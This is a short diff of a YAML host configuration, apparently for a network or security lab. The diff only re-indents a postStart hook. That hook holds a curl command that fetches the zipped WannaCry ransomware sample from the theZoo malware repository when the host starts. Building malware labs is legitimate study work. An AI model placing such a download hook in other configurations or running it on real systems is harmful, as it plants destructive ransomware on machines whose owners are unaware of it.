@@ -34,7 +34,7 @@ hosts:
     env:
     - name: "VERSION"
       value: "7u"
-      postStart:
+    postStart:
       - 'curl -L "https://github.com/ytisf/theZoo/raw/master/malware/Binaries/Ransomware.WannaCry/Ransomware.WannaCry.zip" -o /data/Ransomware.WannaCry.zip'
     posX: 110.4
     posY: 249.0
